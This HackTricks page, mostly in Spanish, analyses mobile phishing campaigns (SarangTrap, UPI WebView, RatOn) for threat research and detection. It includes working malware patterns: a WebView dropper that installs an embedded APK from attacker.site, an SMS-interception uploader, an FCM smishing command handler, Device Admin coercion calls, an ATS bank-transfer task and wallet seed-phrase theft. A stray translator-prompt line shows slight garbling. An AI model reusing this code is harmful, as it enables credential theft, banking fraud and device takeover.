# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas usadas por actores de amenazas para distribuir **malicious Android APKs** y **iOS mobile-configuration profiles** mediante phishing (SEO, ingeniería social, tiendas falsas, apps de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrar docenas de dominios similares (dating, cloud share, car service…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionar en Google.
– Hospedar *tanto* instrucciones de instalación para Android (`.apk`) como para iOS en la misma landing page.
2. **First Stage Download**
* Android: enlace directo a un APK *unsigned* o de “third-party store”.
* iOS: `itms-services://` o enlace HTTPS simple a un **mobileconfig** malicioso (ver más abajo).
3. **Post-install Social Engineering**
* En la primera ejecución la app solicita un **invitation / verification code** (ilusión de acceso exclusivo).
* El código se **POSTea por HTTP** al Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ el malware continúa.
* El análisis dinámico de Sandbox / AV que nunca envía un código válido no ve **comportamiento malicioso** (evasión).
4. **Runtime Permission Abuse** (Android)
* Los permisos peligrosos solo se solicitan **tras una respuesta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recientes **eliminan `<uses-permission>` para SMS del `AndroidManifest.xml`** pero mantienen la ruta de código Java/Kotlin que lee SMS mediante reflection ⇒ reduce la puntuación estática mientras sigue funcionando en dispositivos que conceden el permiso vía `AppOps` abuse o targets antiguos.
5. **Facade UI & Background Collection**
* La app muestra vistas inocuas (visor de SMS, selector de galería) implementadas localmente.
* Mientras tanto exfiltra:
- IMEI / IMSI, número de teléfono
- Volcado completo de `ContactsContract` (array JSON)
- JPEG/PNG desde `/sdcard/DCIM` comprimidos con [Luban](https://github.com/Curzibn/Luban) para reducir tamaño
- SMS opcional (`content://sms`)
Los payloads se **empaquetan en lotes (batch-zipped)** y se envían vía `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un único **mobile-configuration profile** puede requerir `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. para inscribir el dispositivo en una supervisión tipo “MDM”.
* Instrucciones de ingeniería social:
1. Abrir Settings ➜ *Profile downloaded*.
2. Tocar *Install* tres veces (capturas en la página de phishing).
3. Trust el perfil unsigned ➜ el atacante obtiene las entitlements de *Contacts* & *Photo* sin revisión de App Store.
7. **Network Layer**
* HTTP plano, a menudo en el puerto 80 con HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la evaluación del malware, automatizar la fase del invitation code con Frida/Objection para alcanzar la rama maliciosa.
* **Manifest vs. Runtime Diff** – Comparar `aapt dump permissions` con el runtime `PackageManager#getRequestedPermissions()`; permisos peligrosos ausentes son una señal de alerta.
* **Network Canary** – Configurar `iptables -p tcp --dport 80 -j NFQUEUE` para detectar ráfagas inusuales de POST tras la entrada del código.
* **mobileconfig Inspection** – Usar `security cms -D -i profile.mobileconfig` en macOS para listar `PayloadContent` y detectar entitlements excesivos.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** para capturar estallidos repentinos de dominios ricos en palabras clave.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` desde clientes Dalvik fuera de Google Play.
* **Invite-code Telemetry** – POST de códigos numéricos de 6–8 dígitos poco después de la instalación del APK puede indicar staging.
* **MobileConfig Signing** – Bloquear configuration profiles unsigned vía políticas MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Cadena de entrega a través de plataformas de confianza
- YouTube video lure → la descripción contiene un enlace corto
- Enlace corto → sitio de phishing en GitHub Pages que imita el portal legítimo
- El mismo repo de GitHub aloja un APK con una insignia falsa “Google Play” que enlaza directamente al archivo
- Páginas de phishing dinámicas alojadas en Replit; el canal remoto de comandos usa Firebase Cloud Messaging (FCM)

### Dropper con payload embebido e instalación sin conexión
- El primer APK es un installer (dropper) que incluye el malware real en `assets/app.apk` y solicita al usuario que desactive Wi‑Fi/datos móviles para mitigar la detección en la nube.
- El payload embebido se instala bajo una etiqueta inocua (p. ej., “Secure Update”). Después de la instalación, tanto el installer como el payload están presentes como apps separadas.

Consejo para triage estático (usar grep para payloads embebidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de endpoints mediante shortlink
- Malware obtiene una lista en texto plano, separada por comas, de endpoints activos desde un shortlink; simples transformaciones de cadena producen la ruta final de la página de phishing.

Ejemplo (saneado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Captura de credenciales UPI basada en WebView
- El paso “Make payment of ₹1 / UPI‑Lite” carga un formulario HTML malicioso desde el endpoint dinámico dentro de un WebView y captura campos sensibles (teléfono, banco, UPI PIN) que se envían mediante `POST` a `addup.php`.

Cargador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagación e interceptación de SMS/OTP
- Se solicitan permisos agresivos en la primera ejecución:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se recorren para enviar masivamente smishing SMS desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un broadcast receiver y subidos con metadatos (remitente, cuerpo, SIM slot, ID aleatorio por dispositivo) a `/addsm.php`.

Esquema del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- El payload se registra en FCM; los push messages llevan un campo `_type` que se usa como switch para activar acciones (p. ej., actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de payload de FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquema del handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contiene payload secundario en `assets/app.apk`
- WebView carga payment desde `gate.htm` y exfiltrates a `/addup.php`
- SMS exfiltration a `/addsm.php`
- Shortlink-driven config fetch (p. ej., `rebrand.ly/*`) que devuelve endpoints CSV
- Apps etiquetadas como genéricas “Update/Secure Update”
- FCM `data` messages con un discriminador `_type` en apps no confiables

### Detection & defence ideas
- Señalizar apps que instruyen a los usuarios a desactivar la red durante la instalación y luego side-load un segundo APK desde `assets/`.
- Alertar sobre la tupla de permisos: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flujos de pago basados en WebView.
- Monitorización de egress para `POST /addup.php|/addsm.php` en hosts no corporativos; bloquear infraestructura conocida.
- Mobile EDR rules: app no confiable registrándose en FCM y ramificándose según el campo `_type`.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Estudio de caso RatOn

La campaña RatOn banker/RAT (ThreatFabric) es un ejemplo concreto de cómo las operaciones modernas de mobile phishing combinan WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover y hasta NFC-relay orchestration. Esta sección abstrae las técnicas reutilizables.

### Etapa-1: WebView → native install bridge (dropper)

Los atacantes muestran un WebView que apunta a una página maliciosa e inyectan una interfaz JavaScript que expone un instalador nativo. Un toque en un botón HTML llama a código nativo que instala un APK de segunda etapa empaquetado en los assets del dropper y luego lo lanza directamente.

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Por favor pega el contenido HTML/Markdown de la página que quieres que traduzca al español.
```html
<button onclick="bridge.installApk()">Install</button>
```
Después de la instalación, el dropper inicia el payload mediante un package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Embudo de consentimiento: Accessibility + Device Admin + avisos de tiempo de ejecución posteriores
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programáticamente ayuda a aceptar avisos posteriores buscando botones como “Allow”/“OK” en el árbol de nodos y simulando clics.
- Comprobación/solicitud del permiso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Ver también:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Los operadores pueden emitir comandos para:
- mostrar una superposición de pantalla completa desde una URL, o
- pasar HTML inline que se carga en una superposición WebView.

Usos probables: coacción (introducción de PIN), apertura de wallet para capturar PINs, mensajería de rescate. Mantener un comando para asegurarse de que el permiso de superposición esté concedido si falta.

### Remote control model – text pseudo-screen + screen-cast
- Bajo ancho de banda: volcar periódicamente el árbol de nodos Accessibility, serializar los textos visibles/roles/bounds y enviarlos al C2 como una pseudo-pantalla (comandos como `txt_screen` una vez y `screen_live` continuo).
- Alta fidelidad: solicitar MediaProjection y comenzar screen-casting/grabación bajo demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dada una tarea en JSON, abrir la app del banco, controlar la UI vía Accessibility con una mezcla de consultas de texto y toques por coordenadas, e introducir el PIN de pago de la víctima cuando se solicite.

Ejemplo de tarea:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuevo pago"
- "Zadat platbu" → "Introducir pago"
- "Nový příjemce" → "Nuevo destinatario"
- "Domácí číslo účtu" → "Número de cuenta doméstica"
- "Další" → "Siguiente"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sí, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Listo"

Los operadores también pueden comprobar/aumentar los límites de transferencia mediante comandos como `check_limit` y `limit` que navegan por la UI de límites de forma similar.

### Extracción de la frase semilla de wallets cripto
Objetivos como MetaMask, Trust Wallet, Blockchain.com, Phantom. Flujo: desbloquear (PIN robado o contraseña proporcionada), navegar a Security/Recovery, revelar/mostrar la frase semilla, keylog/exfiltrate it. Implementar selectores conscientes de la localización (EN/RU/CZ/SK) para estabilizar la navegación entre idiomas.

### Coerción mediante Device Admin
Device Admin APIs se usan para aumentar las oportunidades de captura del PIN y frustrar a la víctima:

- Bloqueo inmediato:
```java
dpm.lockNow();
```
- Expirar la credencial actual para forzar el cambio (Accessibility captura el nuevo PIN/contraseña):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzar desbloqueo no biométrico deshabilitando las funciones biométricas del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muchos controles de DevicePolicyManager requieren Device Owner/Profile Owner en versiones recientes de Android; algunas builds de OEM pueden ser laxas. Siempre valida en el OS/OEM objetivo.

### Orquestación de relay NFC (NFSkate)
Stage-3 puede instalar y lanzar un módulo externo de NFC-relay (p. ej., NFSkate) e incluso pasarle una plantilla HTML para guiar a la víctima durante el relay. Esto permite cash-out presencial contactless con tarjeta junto con ATS en línea.

Antecedentes: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Conjunto de comandos del operador (ejemplo)
- UI/estado: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Superposiciones: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ideas de detección y defensa (estilo RatOn)
- Buscar WebViews con `addJavascriptInterface()` que expongan métodos de instalador/permiso; páginas que terminan en “/access” que desencadenan prompts de Accessibility.
- Alertar sobre apps que generan gestos/clics de Accessibility a alta frecuencia poco después de obtener acceso al servicio; telemetría que se asemeje a dumps de Accessibility node enviados al C2.
- Monitorizar cambios de políticas de Device Admin en apps no confiables: `lockNow`, expiración de contraseña, alternancias de funciones de keyguard.
- Alertar sobre prompts de MediaProjection de apps no corporativas seguidos por subidas periódicas de frames.
- Detectar la instalación/ejecución de una app externa de NFC-relay desencadenada por otra app.
- Para banca: aplicar confirmaciones fuera de banda, binding biométrico y límites de transacción resistentes a la automatización on-device.

## Referencias

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
